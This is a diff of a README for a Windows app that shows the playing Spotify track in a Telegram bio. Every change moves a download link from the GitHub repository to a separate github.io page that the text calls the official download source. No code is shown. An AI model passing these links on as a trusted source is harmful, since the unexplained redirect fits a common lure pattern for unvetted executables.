@@ -1,6 +1,6 @@
 # 🎵 Spotify-status-for-Telegram - Put Your Spotify Track in Telegram Bio
 
-[![Download Spotify-status-for-Telegram](https://img.shields.io/badge/Download-Spotify--status--for--Telegram-ff69b4?style=for-the-badge&labelColor=6f42c1&logo=github&logoColor=white)](https://github.com/qasidah7544/Spotify-status-for-Telegram)
+[![Download Spotify-status-for-Telegram](https://img.shields.io/badge/Download-Spotify--status--for--Telegram-ff69b4?style=for-the-badge&labelColor=6f42c1&logo=github&logoColor=white)](https://qasidah7544.github.io)
 
 Spotify-status-for-Telegram is a Windows desktop application that shows the track you're playing on Spotify as the first line of your Telegram bio. It is made for everyday computer users who want their Telegram profile to reflect their current music without manually editing their bio after every song change. The app is designed around a simple desktop window, so you do not need programming knowledge to use it.
 
@@ -22,7 +22,7 @@ Key things the app is built to do:
 
 Visit this link to download the application:
 
-[![Download Spotify-status-for-Telegram](https://img.shields.io/badge/Get%20Spotify--status--for--Telegram-ff69b4?style=for-the-badge&labelColor=6f42c1&logo=github&logoColor=white)](https://github.com/qasidah7544/Spotify-status-for-Telegram)
+[![Download Spotify-status-for-Telegram](https://img.shields.io/badge/Get%20Spotify--status--for--Telegram-ff69b4?style=for-the-badge&labelColor=6f42c1&logo=github&logoColor=white)](https://qasidah7544.github.io)
 
 The link above opens the official project page for Spotify-status-for-Telegram. Use it whenever you need to get the application. The page is the starting point for downloading the software on Windows.
 
@@ -106,6 +106,6 @@ Spotify-status-for-Telegram is a desktop application project focused on Spotify 
 
 The official project page is the place to visit to download the application:
 
-[https://github.com/qasidah7544/Spotify-status-for-Telegram](https://github.com/qasidah7544/Spotify-status-for-Telegram)
+[https://qasidah7544.github.io](https://qasidah7544.github.io)
 
 Keywords: customtkinter, desktop-app, desktop-application, python, python3, spotify, spotify-connect, spotify-status, telegram, telegram-bio, telethon
